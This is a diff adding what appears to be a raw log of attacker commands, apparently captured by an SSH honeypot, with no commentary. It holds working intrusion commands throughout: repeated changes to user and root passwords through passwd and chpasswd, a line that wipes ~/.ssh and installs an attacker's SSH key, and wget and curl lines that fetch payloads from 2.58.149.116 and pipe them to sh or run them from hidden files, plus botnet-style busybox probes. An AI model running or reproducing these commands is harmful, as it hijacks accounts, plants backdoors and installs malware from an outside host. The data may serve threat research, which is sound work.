@@ -1,0 +1,2470 @@
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "daniele\nFoTyFszTbNxF\nFoTyFszTbNxF"|passwd|bash
+Enter new UNIX password: 
+echo "daniele\nFoTyFszTbNxF\nFoTyFszTbNxF\n"|passwd
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+which ls
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+echo -e "fedena\na1YyOOsDJkse\na1YyOOsDJkse"|passwd|bash
+echo "fedena\na1YyOOsDJkse\na1YyOOsDJkse\n"|passwd
+echo "root:nBYv4usiy6Av"|chpasswd|bash
+echo -e "ftp123456\nMUXLULjTw2il\nMUXLULjTw2il"|passwd|bash
+echo "ftp123456\nMUXLULjTw2il\nMUXLULjTw2il\n"|passwd
+echo -e "123456\nKEM61hYikmMu\nKEM61hYikmMu"|passwd|bash
+echo "123456\nKEM61hYikmMu\nKEM61hYikmMu\n"|passwd
+echo -e "azureuser\n2Vne8Plptzpu\n2Vne8Plptzpu"|passwd|bash
+echo "azureuser\n2Vne8Plptzpu\n2Vne8Plptzpu\n"|passwd
+echo -e "testdev\nca9RTpm7m3Xp\nca9RTpm7m3Xp"|passwd|bash
+echo "testdev\nca9RTpm7m3Xp\nca9RTpm7m3Xp\n"|passwd
+echo -e "weblogic@123\nZqomwh39ojVi\nZqomwh39ojVi"|passwd|bash
+echo "weblogic@123\nZqomwh39ojVi\nZqomwh39ojVi\n"|passwd
+echo -e "123456\nJu3SGvxFLcQi\nJu3SGvxFLcQi"|passwd|bash
+echo "123456\nJu3SGvxFLcQi\nJu3SGvxFLcQi\n"|passwd
+echo -e "12345\nsdUPT5XDimtR\nsdUPT5XDimtR"|passwd|bash
+echo "12345\nsdUPT5XDimtR\nsdUPT5XDimtR\n"|passwd
+echo -e "zhanglei\n8jgyjF6bi4Bs\n8jgyjF6bi4Bs"|passwd|bash
+echo "zhanglei\n8jgyjF6bi4Bs\n8jgyjF6bi4Bs\n"|passwd
+echo -e "12345\nZJ1hg5uVs48H\nZJ1hg5uVs48H"|passwd|bash
+echo "12345\nZJ1hg5uVs48H\nZJ1hg5uVs48H\n"|passwd
+echo -e "dmdba\nM3tMhkGoQyY1\nM3tMhkGoQyY1"|passwd|bash
+echo "dmdba\nM3tMhkGoQyY1\nM3tMhkGoQyY1\n"|passwd
+echo -e "dmdba\nLzD1RCPkMHSI\nLzD1RCPkMHSI"|passwd|bash
+echo "dmdba\nLzD1RCPkMHSI\nLzD1RCPkMHSI\n"|passwd
+echo -e "123\ncKgVHGy4XHXR\ncKgVHGy4XHXR"|passwd|bash
+echo "123\ncKgVHGy4XHXR\ncKgVHGy4XHXR\n"|passwd
+echo -e "ciadm\nZw5COFzUtWP9\nZw5COFzUtWP9"|passwd|bash
+echo "ciadm\nZw5COFzUtWP9\nZw5COFzUtWP9\n"|passwd
+echo -e "grader\nt2xpWpRIzNBr\nt2xpWpRIzNBr"|passwd|bash
+echo "grader\nt2xpWpRIzNBr\nt2xpWpRIzNBr\n"|passwd
+sh
+enable
+shell
+debug shell
+cmd
+wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh
+echo -e '\x79\x65\x73\x68\x65\x6c\x6f'
+cat /bin/echo
+cat /proc/mounts
+cp /bin/echo //.f && >//.f && echo -e '\x67\x6f\x6f\x64\x77\x72\x69\x74\x65' && chmod 777 //.f; echo -e '\x63\x6d\x64\x67\x6f\x74'
+cd //; wget http://2.58.149.116/spc -O- > .f; ./.f s.spc; >.f; echo test
+echo "root:JpB3KbM1tlOx"|chpasswd|bash
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+echo "root nE7jA%5m" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+echo "root:IRrcgFYpih9V"|chpasswd|bash
+echo -e "1234\nHd10uXuhsIx8\nHd10uXuhsIx8"|passwd|bash
+echo "1234\nHd10uXuhsIx8\nHd10uXuhsIx8\n"|passwd
+echo -e "newpass\nF1uIIv47tBiw\nF1uIIv47tBiw"|passwd|bash
+echo "newpass\nF1uIIv47tBiw\nF1uIIv47tBiw\n"|passwd
+system
+cat /proc/mounts; /bin/busybox CWYKA
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CWYKA
+tftp; wget; /bin/busybox CWYKA
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox CWYKA
+rm .s; exit
+echo "root:SCI6gqBdB8Ha"|chpasswd|bash
+echo -e "newpass\nJcwk7ixxxBIV\nJcwk7ixxxBIV"|passwd|bash
+echo "newpass\nJcwk7ixxxBIV\nJcwk7ixxxBIV\n"|passwd
+echo -e "1234\ngJ7QX5YZ06fb\ngJ7QX5YZ06fb"|passwd|bash
+echo "1234\ngJ7QX5YZ06fb\ngJ7QX5YZ06fb\n"|passwd
+echo -e "PASSWORD\n96mikWYMBVq7\n96mikWYMBVq7"|passwd|bash
+echo "PASSWORD\n96mikWYMBVq7\n96mikWYMBVq7\n"|passwd
+echo -e "qazxsw\nfkuTlMyNscjD\nfkuTlMyNscjD"|passwd|bash
+echo "qazxsw\nfkuTlMyNscjD\nfkuTlMyNscjD\n"|passwd
+echo -e "house\nMapPG2g8F5iW\nMapPG2g8F5iW"|passwd|bash
+echo "house\nMapPG2g8F5iW\nMapPG2g8F5iW\n"|passwd
+echo -e "angel\ndtJpYEEBaFqx\ndtJpYEEBaFqx"|passwd|bash
+echo "angel\ndtJpYEEBaFqx\ndtJpYEEBaFqx\n"|passwd
+echo -e "123456\ntYbomkg2vBLI\ntYbomkg2vBLI"|passwd|bash
+echo "123456\ntYbomkg2vBLI\ntYbomkg2vBLI\n"|passwd
+echo -e "123456\nXZbFb1DnRgt6\nXZbFb1DnRgt6"|passwd|bash
+echo "123456\nXZbFb1DnRgt6\nXZbFb1DnRgt6\n"|passwd
+echo -e "kls\ndEteiJxriaxn\ndEteiJxriaxn"|passwd|bash
+echo "kls\ndEteiJxriaxn\ndEteiJxriaxn\n"|passwd
+echo -e "qazxsw\nHnZaKsxxD2ZY\nHnZaKsxxD2ZY"|passwd|bash
+echo "qazxsw\nHnZaKsxxD2ZY\nHnZaKsxxD2ZY\n"|passwd
+echo -e "PASSWORD\nhweED0Dc2gfi\nhweED0Dc2gfi"|passwd|bash
+echo "PASSWORD\nhweED0Dc2gfi\nhweED0Dc2gfi\n"|passwd
+echo "root:CDOu33IUb3Td"|chpasswd|bash
+echo -e "viktoria\n4S0xYj8MqEcY\n4S0xYj8MqEcY"|passwd|bash
+echo "viktoria\n4S0xYj8MqEcY\n4S0xYj8MqEcY\n"|passwd
+echo -e "tari\n18LmsqerHKZM\n18LmsqerHKZM"|passwd|bash
+echo "tari\n18LmsqerHKZM\n18LmsqerHKZM\n"|passwd
+echo -e "admin123\n8xAAGgCjZC3R\n8xAAGgCjZC3R"|passwd|bash
+echo "admin123\n8xAAGgCjZC3R\n8xAAGgCjZC3R\n"|passwd
+echo -e "usbxkjy\nioxFOj67EnpG\nioxFOj67EnpG"|passwd|bash
+echo "usbxkjy\nioxFOj67EnpG\nioxFOj67EnpG\n"|passwd
+echo -e "support\nTQkChSV8NMCY\nTQkChSV8NMCY"|passwd|bash
+echo "support\nTQkChSV8NMCY\nTQkChSV8NMCY\n"|passwd
+echo -e "seqiauser\nEVxbWcoofSTW\nEVxbWcoofSTW"|passwd|bash
+echo "seqiauser\nEVxbWcoofSTW\nEVxbWcoofSTW\n"|passwd
+echo -e "atul\ncqtfBlUxuEXR\ncqtfBlUxuEXR"|passwd|bash
+echo "atul\ncqtfBlUxuEXR\ncqtfBlUxuEXR\n"|passwd
+echo -e "blhutchings\noxBVsNvK64xI\noxBVsNvK64xI"|passwd|bash
+echo "blhutchings\noxBVsNvK64xI\noxBVsNvK64xI\n"|passwd
+echo -e "tiendashntga\nGrkzM3aWRBh9\nGrkzM3aWRBh9"|passwd|bash
+echo "tiendashntga\nGrkzM3aWRBh9\nGrkzM3aWRBh9\n"|passwd
+echo -e "nate\nJUYxLGCF9RQT\nJUYxLGCF9RQT"|passwd|bash
+echo "nate\nJUYxLGCF9RQT\nJUYxLGCF9RQT\n"|passwd
+echo -e "root\n5KyYvLh6y7sf\n5KyYvLh6y7sf"|passwd|bash
+echo "root\n5KyYvLh6y7sf\n5KyYvLh6y7sf\n"|passwd
+echo -e "nate\nyWUVfnr254hi\nyWUVfnr254hi"|passwd|bash
+echo "nate\nyWUVfnr254hi\nyWUVfnr254hi\n"|passwd
+echo -e "tiendashntga\noScSWOOmarjA\noScSWOOmarjA"|passwd|bash
+echo "tiendashntga\noScSWOOmarjA\noScSWOOmarjA\n"|passwd
+echo -e "blhutchings\nCOk0eMru3kF5\nCOk0eMru3kF5"|passwd|bash
+echo "blhutchings\nCOk0eMru3kF5\nCOk0eMru3kF5\n"|passwd
+echo -e "nate\nj7KnDcjOixPG\nj7KnDcjOixPG"|passwd|bash
+echo "nate\nj7KnDcjOixPG\nj7KnDcjOixPG\n"|passwd
+echo -e "blhutchings\nb27TfsKm47KW\nb27TfsKm47KW"|passwd|bash
+echo "blhutchings\nb27TfsKm47KW\nb27TfsKm47KW\n"|passwd
+echo -e "tiendashntga\n7bDT1kO5jvYk\n7bDT1kO5jvYk"|passwd|bash
+echo "tiendashntga\n7bDT1kO5jvYk\n7bDT1kO5jvYk\n"|passwd
+echo -e "blhutchings\nbIdxzE1H5tiC\nbIdxzE1H5tiC"|passwd|bash
+echo "blhutchings\nbIdxzE1H5tiC\nbIdxzE1H5tiC\n"|passwd
+echo -e "nate\nsaO65I014D1D\nsaO65I014D1D"|passwd|bash
+echo "nate\nsaO65I014D1D\nsaO65I014D1D\n"|passwd
+echo -e "seqiauser\n8jKylRm4QLEs\n8jKylRm4QLEs"|passwd|bash
+echo "seqiauser\n8jKylRm4QLEs\n8jKylRm4QLEs\n"|passwd
+echo -e "tiendashntga\nU0X9AmbEhTZK\nU0X9AmbEhTZK"|passwd|bash
+echo "tiendashntga\nU0X9AmbEhTZK\nU0X9AmbEhTZK\n"|passwd
+echo -e "seqiauser\nwWNqs1WT4x4i\nwWNqs1WT4x4i"|passwd|bash
+echo "seqiauser\nwWNqs1WT4x4i\nwWNqs1WT4x4i\n"|passwd
+echo -e "customer123\nVEBKtA8Wg9O5\nVEBKtA8Wg9O5"|passwd|bash
+echo "customer123\nVEBKtA8Wg9O5\nVEBKtA8Wg9O5\n"|passwd
+echo -e "rafaelrav\nKCJFg1vkLQyo\nKCJFg1vkLQyo"|passwd|bash
+echo "rafaelrav\nKCJFg1vkLQyo\nKCJFg1vkLQyo\n"|passwd
+echo -e "andre123\nHI0KdsoA2m01\nHI0KdsoA2m01"|passwd|bash
+echo "andre123\nHI0KdsoA2m01\nHI0KdsoA2m01\n"|passwd
+echo -e "julian\nCN7Wk5am4UCa\nCN7Wk5am4UCa"|passwd|bash
+echo "julian\nCN7Wk5am4UCa\nCN7Wk5am4UCa\n"|passwd
+echo -e "ksjsb\n7imBlhJ5oHyQ\n7imBlhJ5oHyQ"|passwd|bash
+echo "ksjsb\n7imBlhJ5oHyQ\n7imBlhJ5oHyQ\n"|passwd
+echo -e "matrix\nhZ9uF4LWE7lX\nhZ9uF4LWE7lX"|passwd|bash
+echo "matrix\nhZ9uF4LWE7lX\nhZ9uF4LWE7lX\n"|passwd
+echo -e "andre123\nf4JIptysJ1rQ\nf4JIptysJ1rQ"|passwd|bash
+echo "andre123\nf4JIptysJ1rQ\nf4JIptysJ1rQ\n"|passwd
+echo -e "rafaelrav\nSwontntF5lfY\nSwontntF5lfY"|passwd|bash
+echo "rafaelrav\nSwontntF5lfY\nSwontntF5lfY\n"|passwd
+echo -e "danill\n5HaemgbeugwB\n5HaemgbeugwB"|passwd|bash
+echo "danill\n5HaemgbeugwB\n5HaemgbeugwB\n"|passwd
+echo -e "Joshua123\n9zHQR3pjAIqi\n9zHQR3pjAIqi"|passwd|bash
+echo "Joshua123\n9zHQR3pjAIqi\n9zHQR3pjAIqi\n"|passwd
+echo -e "testadmin\num64Ns3vUf74\num64Ns3vUf74"|passwd|bash
+echo "testadmin\num64Ns3vUf74\num64Ns3vUf74\n"|passwd
+echo -e "hacikbas\noVW2jMHsFMbK\noVW2jMHsFMbK"|passwd|bash
+echo "hacikbas\noVW2jMHsFMbK\noVW2jMHsFMbK\n"|passwd
+echo -e "oracledb\ntMLuGWEWffA7\ntMLuGWEWffA7"|passwd|bash
+echo "oracledb\ntMLuGWEWffA7\ntMLuGWEWffA7\n"|passwd
+echo -e "danill\n9uLVCjsz14bi\n9uLVCjsz14bi"|passwd|bash
+echo "danill\n9uLVCjsz14bi\n9uLVCjsz14bi\n"|passwd
+echo -e "12345\nnmHnvaBjxxyY\nnmHnvaBjxxyY"|passwd|bash
+echo "12345\nnmHnvaBjxxyY\nnmHnvaBjxxyY\n"|passwd
+echo -e "12345\nff6jA9cHV2aq\nff6jA9cHV2aq"|passwd|bash
+echo "12345\nff6jA9cHV2aq\nff6jA9cHV2aq\n"|passwd
+echo -e "andre123\nlTQ8xQtdUBsL\nlTQ8xQtdUBsL"|passwd|bash
+echo "andre123\nlTQ8xQtdUBsL\nlTQ8xQtdUBsL\n"|passwd
+echo -e "julian\n0XTJrQH583Xh\n0XTJrQH583Xh"|passwd|bash
+echo "julian\n0XTJrQH583Xh\n0XTJrQH583Xh\n"|passwd
+echo -e "ksjsb\ntgNbsVHyuNfW\ntgNbsVHyuNfW"|passwd|bash
+echo "ksjsb\ntgNbsVHyuNfW\ntgNbsVHyuNfW\n"|passwd
+echo -e "123456\naJ4zd0dYql9x\naJ4zd0dYql9x"|passwd|bash
+echo "123456\naJ4zd0dYql9x\naJ4zd0dYql9x\n"|passwd
+echo -e "abc123\nDXspGcDpNxuv\nDXspGcDpNxuv"|passwd|bash
+echo "abc123\nDXspGcDpNxuv\nDXspGcDpNxuv\n"|passwd
+echo -e "jasonbaj\ntnP1llZwv1RM\ntnP1llZwv1RM"|passwd|bash
+echo "jasonbaj\ntnP1llZwv1RM\ntnP1llZwv1RM\n"|passwd
+cat /proc/mounts; /bin/busybox NIIGJ
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NIIGJ
+tftp; wget; /bin/busybox NIIGJ
+/bin/busybox NIIGJ
+echo -e "testadmin\nyV8a1uPP45Ps\nyV8a1uPP45Ps"|passwd|bash
+echo "testadmin\nyV8a1uPP45Ps\nyV8a1uPP45Ps\n"|passwd
+echo -e "ito\n7G2hfvREq9L2\n7G2hfvREq9L2"|passwd|bash
+echo "ito\n7G2hfvREq9L2\n7G2hfvREq9L2\n"|passwd
+echo -e "!QAZ2wsx\nvHL6NKHiNi23\nvHL6NKHiNi23"|passwd|bash
+echo "!QAZ2wsx\nvHL6NKHiNi23\nvHL6NKHiNi23\n"|passwd
+echo -e "msilver\nCTkZ69maoXgl\nCTkZ69maoXgl"|passwd|bash
+echo "msilver\nCTkZ69maoXgl\nCTkZ69maoXgl\n"|passwd
+uname -s -m
+echo -e "scaner\nFGeIseKYLIn0\nFGeIseKYLIn0"|passwd|bash
+echo "scaner\nFGeIseKYLIn0\nFGeIseKYLIn0\n"|passwd
+cat /proc/mounts; /bin/busybox KAMSP
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KAMSP
+tftp; wget; /bin/busybox KAMSP
+/bin/busybox KAMSP
+echo -e "cms\nIK7Q8E3UF33m\nIK7Q8E3UF33m"|passwd|bash
+echo "cms\nIK7Q8E3UF33m\nIK7Q8E3UF33m\n"|passwd
+echo -e "abc@123\nDzVnarYpy2YM\nDzVnarYpy2YM"|passwd|bash
+echo "abc@123\nDzVnarYpy2YM\nDzVnarYpy2YM\n"|passwd
+echo -e "veeam\ncK2f6Vs5GnF3\ncK2f6Vs5GnF3"|passwd|bash
+echo "veeam\ncK2f6Vs5GnF3\ncK2f6Vs5GnF3\n"|passwd
+echo -e "enxbt\ndsXXRIZ5E3r7\ndsXXRIZ5E3r7"|passwd|bash
+echo "enxbt\ndsXXRIZ5E3r7\ndsXXRIZ5E3r7\n"|passwd
+echo "root:rZrFIBTMu1JI"|chpasswd|bash
+echo -e "lhy123\nN6mR5HVa7IXS\nN6mR5HVa7IXS"|passwd|bash
+echo "lhy123\nN6mR5HVa7IXS\nN6mR5HVa7IXS\n"|passwd
+echo -e "code2\n38O2XNAfE6G0\n38O2XNAfE6G0"|passwd|bash
+echo "code2\n38O2XNAfE6G0\n38O2XNAfE6G0\n"|passwd
+echo -e "charlesr\nGzJwxxfxfzDF\nGzJwxxfxfzDF"|passwd|bash
+echo "charlesr\nGzJwxxfxfzDF\nGzJwxxfxfzDF\n"|passwd
+echo -e "John\nsGZp3XTwSjRd\nsGZp3XTwSjRd"|passwd|bash
+echo "John\nsGZp3XTwSjRd\nsGZp3XTwSjRd\n"|passwd
+echo "root:9CDAifeOgx9k"|chpasswd|bash
+echo -e "swbrown\nTtLiy4M5TJTI\nTtLiy4M5TJTI"|passwd|bash
+echo "swbrown\nTtLiy4M5TJTI\nTtLiy4M5TJTI\n"|passwd
+echo -e "abc@123\nnTsl1D84JKkY\nnTsl1D84JKkY"|passwd|bash
+echo "abc@123\nnTsl1D84JKkY\nnTsl1D84JKkY\n"|passwd
+echo -e "pc77club\n1stm8fHX09q6\n1stm8fHX09q6"|passwd|bash
+echo "pc77club\n1stm8fHX09q6\n1stm8fHX09q6\n"|passwd
+echo "root:whxFty3zZzbt"|chpasswd|bash
+echo -e "123456\n4BUmflzjX5hC\n4BUmflzjX5hC"|passwd|bash
+echo "123456\n4BUmflzjX5hC\n4BUmflzjX5hC\n"|passwd
+echo -e "123456\nSgGsSDaFAE89\nSgGsSDaFAE89"|passwd|bash
+echo "123456\nSgGsSDaFAE89\nSgGsSDaFAE89\n"|passwd
+echo -e "123456\nAX0s2wCJkRHu\nAX0s2wCJkRHu"|passwd|bash
+echo "123456\nAX0s2wCJkRHu\nAX0s2wCJkRHu\n"|passwd
+echo -e "123456\nX0NBcFpoVD5f\nX0NBcFpoVD5f"|passwd|bash
+echo "123456\nX0NBcFpoVD5f\nX0NBcFpoVD5f\n"|passwd
+echo -e "changeme\n9YkO71HOOLRi\n9YkO71HOOLRi"|passwd|bash
+echo "changeme\n9YkO71HOOLRi\n9YkO71HOOLRi\n"|passwd
+echo -e "jobsilense\nEL2Ya8IOHwAG\nEL2Ya8IOHwAG"|passwd|bash
+echo -e "mikem\nEL2Ya8IOHwAG\nEL2Ya8IOHwAG"|passwd|bash
+echo "jobsilense\nEL2Ya8IOHwAG\nEL2Ya8IOHwAG\n"|passwd
+echo "mikem\nEL2Ya8IOHwAG\nEL2Ya8IOHwAG\n"|passwd
+echo -e "care\niJFDgLVpRhgS\niJFDgLVpRhgS"|passwd|bash
+echo "care\niJFDgLVpRhgS\niJFDgLVpRhgS\n"|passwd
+echo -e "Pa$$word\nXJkWkHTc8iaE\nXJkWkHTc8iaE"|passwd|bash
+echo "Pa$$word\nXJkWkHTc8iaE\nXJkWkHTc8iaE\n"|passwd
+echo -e "encargados\nqq4USonNj8P6\nqq4USonNj8P6"|passwd|bash
+echo "encargados\nqq4USonNj8P6\nqq4USonNj8P6\n"|passwd
+echo -e "encargados\nMnmnIM8bhwlQ\nMnmnIM8bhwlQ"|passwd|bash
+echo "root:ouAFdqmKwG5v"|chpasswd|bash
+echo "encargados\nMnmnIM8bhwlQ\nMnmnIM8bhwlQ\n"|passwd
+echo -e "bodega\nEL2Ya8IOHwAG\nEL2Ya8IOHwAG"|passwd|bash
+echo "bodega\nEL2Ya8IOHwAG\nEL2Ya8IOHwAG\n"|passwd
+echo -e "chavosh\nMiRnSoFRCkm3\nMiRnSoFRCkm3"|passwd|bash
+echo -e "dragan\nMiRnSoFRCkm3\nMiRnSoFRCkm3"|passwd|bash
+echo "chavosh\nMiRnSoFRCkm3\nMiRnSoFRCkm3\n"|passwd
+echo -e "bodega\nMiRnSoFRCkm3\nMiRnSoFRCkm3"|passwd|bash
+echo "dragan\nMiRnSoFRCkm3\nMiRnSoFRCkm3\n"|passwd
+echo -e "mysql123\nWc2VBuxFxy0p\nWc2VBuxFxy0p"|passwd|bash
+echo "bodega\nMiRnSoFRCkm3\nMiRnSoFRCkm3\n"|passwd
+echo "mysql123\nWc2VBuxFxy0p\nWc2VBuxFxy0p\n"|passwd
+echo -e "marcob\nCzxRekSva4If\nCzxRekSva4If"|passwd|bash
+echo "marcob\nCzxRekSva4If\nCzxRekSva4If\n"|passwd
+echo -e "wirat\nBlK0xA6OVySb\nBlK0xA6OVySb"|passwd|bash
+echo "wirat\nBlK0xA6OVySb\nBlK0xA6OVySb\n"|passwd
+echo -e "care\nT4wBiQ2wPB2O\nT4wBiQ2wPB2O"|passwd|bash
+echo -e "123456\ntp4MwikAH2VN\ntp4MwikAH2VN"|passwd|bash
+echo "care\nT4wBiQ2wPB2O\nT4wBiQ2wPB2O\n"|passwd
+echo -e "encargados\nVetWHxkO8Cth\nVetWHxkO8Cth"|passwd|bash
+echo "123456\ntp4MwikAH2VN\ntp4MwikAH2VN\n"|passwd
+echo -e "wirat\nVetWHxkO8Cth\nVetWHxkO8Cth"|passwd|bash
+echo "encargados\nVetWHxkO8Cth\nVetWHxkO8Cth\n"|passwd
+echo "wirat\nVetWHxkO8Cth\nVetWHxkO8Cth\n"|passwd
+echo "root:BnrHzAM22PtA"|chpasswd|bash
+echo -e "qingpeng\njEX1B55QylGG\njEX1B55QylGG"|passwd|bash
+echo -e "chavosh\njEX1B55QylGG\njEX1B55QylGG"|passwd|bash
+echo -e "mysql123\njEX1B55QylGG\njEX1B55QylGG"|passwd|bash
+echo -e "123456\n2fXAVyosbeA2\n2fXAVyosbeA2"|passwd|bash
+echo -e "renatav\nTgs6yUHxHg4W\nTgs6yUHxHg4W"|passwd|bash
+echo "qingpeng\njEX1B55QylGG\njEX1B55QylGG\n"|passwd
+echo "chavosh\njEX1B55QylGG\njEX1B55QylGG\n"|passwd
+echo "mysql123\njEX1B55QylGG\njEX1B55QylGG\n"|passwd
+echo "123456\n2fXAVyosbeA2\n2fXAVyosbeA2\n"|passwd
+echo "renatav\nTgs6yUHxHg4W\nTgs6yUHxHg4W\n"|passwd
+echo -e "123456\ndNEtf2nqAGHX\ndNEtf2nqAGHX"|passwd|bash
+echo -e "wirat\ndNEtf2nqAGHX\ndNEtf2nqAGHX"|passwd|bash
+echo "root:Ue6S3Nz55Fwe"|chpasswd|bash
+echo "123456\ndNEtf2nqAGHX\ndNEtf2nqAGHX\n"|passwd
+echo "wirat\ndNEtf2nqAGHX\ndNEtf2nqAGHX\n"|passwd
+echo -e "renatav\nuSgJMezfGjle\nuSgJMezfGjle"|passwd|bash
+echo -e "ctejedor\nI4AerkbTFE94\nI4AerkbTFE94"|passwd|bash
+echo -e "chavosh\nDlMl5il06gbR\nDlMl5il06gbR"|passwd|bash
+echo -e "123456789\nWpGU75sO0efh\nWpGU75sO0efh"|passwd|bash
+echo "renatav\nuSgJMezfGjle\nuSgJMezfGjle\n"|passwd
+echo "root:GehPwGxapRkp"|chpasswd|bash
+echo "ctejedor\nI4AerkbTFE94\nI4AerkbTFE94\n"|passwd
+echo "chavosh\nDlMl5il06gbR\nDlMl5il06gbR\n"|passwd
+echo "123456789\nWpGU75sO0efh\nWpGU75sO0efh\n"|passwd
+echo -e "123456\ncqcRPrOTYspb\ncqcRPrOTYspb"|passwd|bash
+echo -e "jeus\ncqcRPrOTYspb\ncqcRPrOTYspb"|passwd|bash
+echo -e "123456789\ndxM1oueEHqKg\ndxM1oueEHqKg"|passwd|bash
+echo -e "qingpeng\ndxM1oueEHqKg\ndxM1oueEHqKg"|passwd|bash
+echo -e "qingpeng\nVb8sEc0jPKGT\nVb8sEc0jPKGT"|passwd|bash
+echo -e "123456\nznqu70S3rY4c\nznqu70S3rY4c"|passwd|bash
+echo -e "jeus\naFpjX5yMBLJA\naFpjX5yMBLJA"|passwd|bash
+echo -e "password\nznqu70S3rY4c\nznqu70S3rY4c"|passwd|bash
+echo "123456\ncqcRPrOTYspb\ncqcRPrOTYspb\n"|passwd
+echo "jeus\ncqcRPrOTYspb\ncqcRPrOTYspb\n"|passwd
+echo "123456789\ndxM1oueEHqKg\ndxM1oueEHqKg\n"|passwd
+echo "qingpeng\ndxM1oueEHqKg\ndxM1oueEHqKg\n"|passwd
+echo "qingpeng\nVb8sEc0jPKGT\nVb8sEc0jPKGT\n"|passwd
+echo "123456\nznqu70S3rY4c\nznqu70S3rY4c\n"|passwd
+echo "jeus\naFpjX5yMBLJA\naFpjX5yMBLJA\n"|passwd
+echo "password\nznqu70S3rY4c\nznqu70S3rY4c\n"|passwd
+echo -e "qingpeng\nE7TdeptU2hay\nE7TdeptU2hay"|passwd|bash
+echo -e "qa\nqSWfmRl3lpop\nqSWfmRl3lpop"|passwd|bash
+echo "root:qSWfmRl3lpop"|chpasswd|bash
+echo "qingpeng\nE7TdeptU2hay\nE7TdeptU2hay\n"|passwd
+echo "qa\nqSWfmRl3lpop\nqSWfmRl3lpop\n"|passwd
+echo -e "yuyongxin\nE3qgBX40KfLm\nE3qgBX40KfLm"|passwd|bash
+echo "yuyongxin\nE3qgBX40KfLm\nE3qgBX40KfLm\n"|passwd
+echo "root:BKUM91pV4tt9"|chpasswd|bash
+echo -e "franco\nUmaZDKOGtcwI\nUmaZDKOGtcwI"|passwd|bash
+echo -e "franco\nwFTNX5Rwu6h1\nwFTNX5Rwu6h1"|passwd|bash
+echo -e "yuyongxin\nsM7ZZfmcmaOh\nsM7ZZfmcmaOh"|passwd|bash
+echo "franco\nUmaZDKOGtcwI\nUmaZDKOGtcwI\n"|passwd
+echo "franco\nwFTNX5Rwu6h1\nwFTNX5Rwu6h1\n"|passwd
+echo -e "fiscal\nsM7ZZfmcmaOh\nsM7ZZfmcmaOh"|passwd|bash
+echo -e "posp\n7BwXF6bkyPl7\n7BwXF6bkyPl7"|passwd|bash
+echo -e "Majestickmaje\nYwA2ufyr6N0L\nYwA2ufyr6N0L"|passwd|bash
+echo "yuyongxin\nsM7ZZfmcmaOh\nsM7ZZfmcmaOh\n"|passwd
+echo "fiscal\nsM7ZZfmcmaOh\nsM7ZZfmcmaOh\n"|passwd
+echo -e "cassandra\nhpbJkCPw2Hb8\nhpbJkCPw2Hb8"|passwd|bash
+echo -e "elaine\nNDuXiHRXaKyS\nNDuXiHRXaKyS"|passwd|bash
+echo -e "estudioremoto\nNDuXiHRXaKyS\nNDuXiHRXaKyS"|passwd|bash
+echo "posp\n7BwXF6bkyPl7\n7BwXF6bkyPl7\n"|passwd
+echo "Majestickmaje\nYwA2ufyr6N0L\nYwA2ufyr6N0L\n"|passwd
+echo "root:hpbJkCPw2Hb8"|chpasswd|bash
+echo -e "987654321\nxHVyhXXv2Bg4\nxHVyhXXv2Bg4"|passwd|bash
+echo -e "123456\n1qo8cfhrbf9C\n1qo8cfhrbf9C"|passwd|bash
+echo "root:TtNUQ2UUbYZ8"|chpasswd|bash
+echo -e "mysql@123\n1qo8cfhrbf9C\n1qo8cfhrbf9C"|passwd|bash
+echo -e "roy123\n1qo8cfhrbf9C\n1qo8cfhrbf9C"|passwd|bash
+echo -e "celery\n1qo8cfhrbf9C\n1qo8cfhrbf9C"|passwd|bash
+echo "root:DddBNqAnfcDb"|chpasswd|bash
+echo "cassandra\nhpbJkCPw2Hb8\nhpbJkCPw2Hb8\n"|passwd
+echo "elaine\nNDuXiHRXaKyS\nNDuXiHRXaKyS\n"|passwd
+echo "estudioremoto\nNDuXiHRXaKyS\nNDuXiHRXaKyS\n"|passwd
+echo "987654321\nxHVyhXXv2Bg4\nxHVyhXXv2Bg4\n"|passwd
+echo -e "presto\nDddBNqAnfcDb\nDddBNqAnfcDb"|passwd|bash
+echo -e "123456\n2xmNoWLJ3wIr\n2xmNoWLJ3wIr"|passwd|bash
+echo "123456\n1qo8cfhrbf9C\n1qo8cfhrbf9C\n"|passwd
+echo "mysql@123\n1qo8cfhrbf9C\n1qo8cfhrbf9C\n"|passwd
+echo "roy123\n1qo8cfhrbf9C\n1qo8cfhrbf9C\n"|passwd
+echo "celery\n1qo8cfhrbf9C\n1qo8cfhrbf9C\n"|passwd
+echo -e "123456\n3iajUiYM7NR9\n3iajUiYM7NR9"|passwd|bash
+echo -e "123456\nfECykAjE9iae\nfECykAjE9iae"|passwd|bash
+echo -e "celery\nYjXMsBxTpDvV\nYjXMsBxTpDvV"|passwd|bash
+echo -e "test\nM5TuyeAc0J96\nM5TuyeAc0J96"|passwd|bash
+echo -e "jbquilla\n3iajUiYM7NR9\n3iajUiYM7NR9"|passwd|bash
